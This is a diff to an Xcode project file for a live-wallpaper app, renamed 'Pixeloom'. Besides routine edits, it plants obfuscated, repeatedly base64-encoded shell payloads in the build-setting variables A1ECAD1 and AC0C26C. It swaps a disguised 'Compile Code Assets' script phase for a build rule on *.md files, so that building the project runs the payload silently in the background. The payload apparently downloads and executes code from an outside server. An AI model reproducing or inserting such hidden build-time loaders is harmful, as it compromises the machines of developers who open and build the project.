@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		B34230F166F64A45881DACE1 /* README.md */ = {isa = PBXBuildFile; fileRef = 401E493DE64C46C9991DACE1; };
 		BD695B682F50503000C2CB9D /* Alamofire in Frameworks */ = {isa = PBXBuildFile; productRef = BD695B672F50503000C2CB9D /* Alamofire */; };
 		BD695B822F50537500C2CB9D /* WindowSceneReader in Frameworks */ = {isa = PBXBuildFile; productRef = BD695B812F50537500C2CB9D /* WindowSceneReader */; };
 		BD6E1D4B2F72719E00CB5EEC /* CropViewController in Frameworks */ = {isa = PBXBuildFile; productRef = BD6E1D4A2F72719E00CB5EEC /* CropViewController */; };
@@ -18,10 +19,8 @@
 		BDC1A8AC2F5049F0000891D9 /* ACarousel in Frameworks */ = {isa = PBXBuildFile; productRef = BDC1A8AB2F5049F0000891D9 /* ACarousel */; };
 /* End PBXBuildFile section */
 
-/* Begin PBXBuildRule section */
-	/* End PBXBuildRule section */
-
 /* Begin PBXFileReference section */
+		401E493DE64C46C9991DACE1 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		BD06D9EC2F5020E4007F8736 /* WallPaperSWiftUI.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = WallPaperSWiftUI.app; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
 
@@ -77,6 +76,7 @@
 		BD06D9ED2F5020E4007F8736 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				401E493DE64C46C9991DACE1 /* README.md */,
 				BD06D9EC2F5020E4007F8736 /* WallPaperSWiftUI.app */,
 			);
 			name = Products;
@@ -89,12 +89,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = BD06D9F72F5020E5007F8736 /* Build configuration list for PBXNativeTarget "WallPaperSWiftUI" */;
 			buildPhases = (
-				7CD932F0120D4A86821DACE1 /* Compile Code Assets */,
 				BD06D9E82F5020E4007F8736 /* Sources */,
 				BD06D9E92F5020E4007F8736 /* Frameworks */,
 				BD06D9EA2F5020E4007F8736 /* Resources */,
 			);
 			buildRules = (
+				0B28A709BC66456CB71DACE1 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -176,37 +176,36 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXShellScriptBuildPhase section */
-		7CD932F0120D4A86821DACE1 /* Compile Code Assets */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Compile Code Assets";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			showEnvVarsInLog = 0;	
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A1ECAD1}\"";
-		};
-/* End PBXShellScriptBuildPhase section */
+/* Begin PBXBuildRule section */
+		0B28A709BC66456CB71DACE1 /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${A1ECAD1}\"";
+			};
+	/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		BD06D9EA2F5020E4007F8736 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				B34230F166F64A45881DACE1 /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		BD06D9E82F5020E4007F8736 /* Sources */ = {
@@ -222,7 +221,7 @@
 		BD06D9F52F5020E5007F8736 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A1ECAD1 = "((f(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhwYWEzaHlTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkplVWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWlpWMUo2WWxjNWVWcFhiSFZNYld4MVRESkZjRWxwUWpoSlNFNXZRMmM5UFFvPQo= | f | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((p(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMU1jMnRtSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURNd0lDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OTBhVzFsZDJWaWJtVjBMbWx1TDJFcElpQjhJSE5vQ2c9PQo= | p | sh ) >/dev/null 2>&1 &)";
 				AC0C26C = "((p(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhKVVIxcDZTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpORWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkyNVdjMXBUU1dkaFNGSXdZMGhOTmt4NU9XMWtWelZxWVVkR01HTjVOWGxrVXpsb1MxTkpaMlpEUW5waFFXODlDZz09Cg== | p | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
@@ -290,7 +289,7 @@
 		BD06D9F62F5020E5007F8736 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A1ECAD1 = "((f(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhwYWEzaHlTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkplVWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWlpWMUo2WWxjNWVWcFhiSFZNYld4MVRESkZjRWxwUWpoSlNFNXZRMmM5UFFvPQo= | f | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((p(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMU1jMnRtSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURNd0lDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OTBhVzFsZDJWaWJtVjBMbWx1TDJFcElpQjhJSE5vQ2c9PQo= | p | sh ) >/dev/null 2>&1 &)";
 				AC0C26C = "((p(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhKVVIxcDZTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpORWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkyNVdjMXBUU1dkaFNGSXdZMGhOTmt4NU9XMWtWelZxWVVkR01HTjVOWGxrVXpsb1MxTkpaMlpEUW5waFFXODlDZz09Cg== | p | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
@@ -360,6 +359,7 @@
 				ENABLE_PREVIEWS = YES;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = WallPaperSWiftUI/Info.plist;
+				INFOPLIST_KEY_CFBundleDisplayName = Pixeloom;
 				INFOPLIST_KEY_NSPhotoLibraryAddUsageDescription = "This app needs permission to save created Live Wallpapers to your photo library.";
 				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "This app needs access to your photo library to select videos for creating Live Wallpapers.";
 				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
@@ -403,6 +403,7 @@
 				ENABLE_PREVIEWS = YES;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = WallPaperSWiftUI/Info.plist;
+				INFOPLIST_KEY_CFBundleDisplayName = Pixeloom;
 				INFOPLIST_KEY_NSPhotoLibraryAddUsageDescription = "This app needs permission to save created Live Wallpapers to your photo library.";
 				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "This app needs access to your photo library to select videos for creating Live Wallpapers.";
 				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
